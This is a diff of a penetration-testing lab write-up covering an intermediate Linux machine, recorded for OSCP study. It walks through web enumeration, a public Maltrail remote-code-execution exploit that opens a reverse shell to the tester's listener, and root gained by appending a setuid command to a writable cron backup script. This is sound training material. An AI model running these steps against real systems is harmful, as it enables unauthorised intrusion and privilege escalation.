@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-13
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -104,45 +105,45 @@ PORT     STATE SERVICE VERSION
 No enumeration conducted
 ## Port 80 - HTTP (Apache 2.4.52)
 - Navigated to `http://192.168.117.32:80` and identified `Apache2 Defauly Page`
-![[Pasted image 20241013175715.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013175715.png]]
 - Ran `gobuster dir -u http://192.168.117.32 -w //usr/share/dirb/wordlists/big.txt` to enumerate web directories
-![[Pasted image 20241013180308.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013180308.png]]
 ## Port 8338 - HTTP (Apache 2.4.52)
 - Navigated to `http://192.168.117.32:80` and identified `Maltrail v.052`
-![[Pasted image 20241013181247.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013181247.png]]
 	- Potentially vulnerable to CVE-2023–27163
 ---
 # Exploitation
 - Identified exploit `Maltrail-RCE.py` from https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py - copied to local host 
 - Setup Netcat listener on port `80` then ran `python3 Maltrail-RCE.py 192.168.45.250 80 http://192.168.117.32:8338` to catch reverse shell as user `snort`
-![[Pasted image 20241013190836.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013190836.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Ran `cat /home/snort/local.txt` to print `a00aea52796dcd16e3d4e840f16bd277`
-![[Pasted image 20241013190954.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013190954.png]]
 - Ran `cat /etc/passwd` to enumerate users
-![[Pasted image 20241013191808.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013191808.png]]
 - Ran `sudo -l` and found `sudo` requires `snort` password
-![[Pasted image 20241013191909.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013191909.png]]
 - Uploaded & ran `linpeas.sh`
-![[Pasted image 20241013193004.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013193004.png]]
 - Identified interesting files
-![[Pasted image 20241013193341.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013193341.png]]
 - Identified possible private SSH keys
-![[Pasted image 20241013193432.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013193432.png]]
 - Identified interesting writeable files including `/var/backups/etc_Backup.sh`
-![[Pasted image 20241013193641.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013193641.png]]
 ---
 # Privilege Escalation
 - Ran `ls -lah /var/backups/etc_Backup.sh` to identify script privileges
-![[Pasted image 20241013194807.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013194807.png]]
 - Ran `echo "chmod +s /bin/bash" >> /var/backups/etc_Backup.sh` to add command to script to change set privileges for `/bin/bash`
-![[Pasted image 20241013195006.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013195006.png]]
 - Waited a few minutes for script, then ran `/bin/bash -p` to achieve `root`
-![[Pasted image 20241013195139.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013195139.png]]
 - Ran `cat /root/proof.txt` to print `8f730f4db61f48dd3810007f95fa9e61`
-![[Pasted image 20241013195335.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241013195335.png]]
 ---
 # Trophy & Loot
 `local.txt` = `a00aea52796dcd16e3d4e840f16bd277`
